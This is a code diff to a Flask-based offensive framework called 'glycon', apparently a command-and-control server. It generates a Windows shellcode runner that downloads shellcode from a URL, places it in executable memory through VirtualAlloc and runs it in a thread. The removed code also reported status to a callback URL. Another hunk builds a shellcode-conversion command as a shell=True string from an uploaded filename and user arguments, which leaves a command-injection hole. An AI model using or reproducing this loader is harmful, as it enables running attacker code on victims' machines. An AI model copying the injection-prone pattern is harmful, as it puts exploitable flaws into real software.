@@ -1,4 +1,4 @@
-﻿import os
+import os
 import sqlite3
 from flask import jsonify, request, Response, send_from_directory
 from flask_login import login_required
@@ -16,79 +16,57 @@ from glycon.config import CONFIG
 import traceback  # For detailed error reporting
 
 def _generate_runner_script(shellcode_url, callback_url=None):
-    """Generate the Python runner script that will download and execute shellcode and optionally send output back"""
-    callback_code = ""
-    if callback_url:
-        callback_code = f'''
-import json
+    """Generate the Python runner script that will download and execute shellcode"""
+    return f"""import socket
+import ctypes
+import argparse
+import struct
 import requests
-def send_status(url, data):
-    try:
-        headers = {{'Content-Type': 'application/json'}}
-        requests.post(url, data=json.dumps(data), headers=headers, verify=False, timeout=5)
-    except Exception:
-        pass
-'''
-    return f"""import ctypes as mill
-import sys, requests as r
 import urllib3
-import io
-import contextlib
-import traceback
+import sys
+
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-{callback_code}
-output = io.StringIO()
-def mi(little):   
-    print("Starting shellcode runner script")
+
+def recv_shellcode(url):
+    response = requests.get(url, verify=False)
+    response.raise_for_status()
+    return response.content
+
+def execute_shellcode(shellcode):
+    import threading
+    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
+    ctypes.windll.kernel32.RtlCopyMemory.argtypes = (ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t)
+    space = ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode), 0x3000, 0x40)
+    buff = (ctypes.c_char * len(shellcode)).from_buffer_copy(shellcode)
+    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_void_p(space), buff, len(shellcode))
+
+    def run_shellcode():
+        shellcode_func = ctypes.CFUNCTYPE(None)(space)
+        shellcode_func()
+
+    threading.Thread(target=run_shellcode).start()
+    # Shellcode runs in background thread without blocking
+
+def mi(little):
+    print("Starting shellcode execution")
     try:
-        bmx = r.get(little, verify=False).content
-        print(f"Downloaded shellcode of length: {{len(bmx)}}")
-    except r.exceptions.RequestException as e:
+        shellcode = recv_shellcode(little)
+        print(f"Downloaded {{len(shellcode)}} bytes")
+        # Save downloaded shellcode for inspection
+        with open('downloaded_shellcode.bin', 'wb') as f:
+            f.write(shellcode)
+        print("Saved downloaded shellcode to downloaded_shellcode.bin")
+    except Exception as e:
         print(f"Error downloading file: {{e}}")
-        if {bool(callback_url)}:
-            try:
-                send_status('{callback_url}', {{'status': 'error', 'message': str(e), 'output': output.getvalue()}})
-            except Exception:
-                pass
         return
 
-    mill.windll.kernel32.VirtualAlloc.restype = mill.c_void_p
-    mill.windll.kernel32.CreateThread.argtypes = (
-        mill.c_int, mill.c_int, mill.c_void_p, mill.c_int, mill.c_int, mill.POINTER(mill.c_int))
-
-    try:
-        print("Allocating memory for shellcode")
-        spc = mill.windll.kernel32.VirtualAlloc(
-            mill.c_int(0), mill.c_int(len(bmx)), mill.c_int(0x3000), mill.c_int(0x40))
-        print(f"Memory allocated at address: {{spc}}")
-        bf = (mill.c_char * len(bmx)).from_buffer_copy(bmx)
-        mill.windll.kernel32.RtlMoveMemory(mill.c_void_p(spc), bf, mill.c_int(len(bmx)))
-        print("Shellcode copied to allocated memory")
-        hndl = mill.windll.kernel32.CreateThread(
-            mill.c_int(0), mill.c_int(0), mill.c_void_p(spc), mill.c_int(0), mill.c_int(0),
-            mill.pointer(mill.c_int(0)))
-        print(f"Thread created with handle: {{hndl}}")
-
-        mill.windll.kernel32.WaitForSingleObject(hndl, mill.c_uint32(0xffffffff))
-        print("Shellcode executed successfully")
-        if {bool(callback_url)}:
-            try:
-                send_status('{callback_url}', {{'status': 'success', 'message': 'Shellcode executed', 'output': output.getvalue()}})
-            except Exception:
-                pass
-    except Exception as e:
-        print("Exception during shellcode execution:")
-        traceback.print_exc()
-        if {bool(callback_url)}:
-            try:
-                send_status('{callback_url}', {{'status': 'error', 'message': str(e), 'output': output.getvalue()}})
-            except Exception:
-                pass
+    print("Executing shellcode")
+    execute_shellcode(shellcode)
+    print("Execution completed")
 
 if __name__ == "__main__":
     little = "{shellcode_url}"
-    with contextlib.redirect_stdout(output):
-        mi(little)
+    mi(little)
 """
 
 
@@ -852,22 +830,17 @@ def init_api_routes(app, socketio):
                 
                 # Build donut command
                 args_str = str(args) if args else ''
-                
-                cmd = [
-                    'docker', 'run', '--rm',
-                    '-v', f"{temp_dir}:/workdir",
-                    'donut',
-                    '-e', str(entropy),
-                    '-a', str(arch),
-                    '-o', f"/workdir/{output_name}.bin",
-                    '-f', '1',
-                    '-p', f'"{args_str}"',
-                    '-i', f"/workdir/{file.filename}"
-                ]
+
+                cmd = f"docker run --rm -v {temp_dir}:/workdir donut -e {entropy} -a {arch} -o /workdir/{output_name}.bin -f 1"
+
+                if args_str:
+                    cmd += f' -p "{args_str}"'
+
+                cmd += f" -i /workdir/{file.filename}"
 
                 # Run donut and properly handle the response
                 try:
-                    result = subprocess.run(cmd, capture_output=True, text=True, check=True)
+                    result = subprocess.run(cmd, shell=True, capture_output=True, text=True, check=True)
                     if result.returncode != 0:
                         raise Exception(f"Donut failed: {result.stderr}")
                     
@@ -1285,13 +1258,13 @@ def init_api_routes(app, socketio):
         import time
         shellcode_dir = os.path.join(app.root_path, 'shellcodes')
         shellcode_path = os.path.join(shellcode_dir, shellcode_name)
-        
+
         if not os.path.exists(shellcode_path):
             return jsonify({"status": "error", "message": "Shellcode not found"}), 404
-        
+
         response = send_from_directory(shellcode_dir, shellcode_name, as_attachment=True)
-        
-        def delete_file_later(path, delay=10):
+
+        def delete_file_later(path, delay=300):  # Increased delay to 5 minutes for large files
             def delayed_delete():
                 time.sleep(delay)
                 try:
@@ -1300,6 +1273,6 @@ def init_api_routes(app, socketio):
                 except Exception as e:
                     app.logger.error(f"Error deleting shellcode file {path}: {str(e)}")
             threading.Thread(target=delayed_delete).start()
-        
+
         delete_file_later(shellcode_path)
         return response
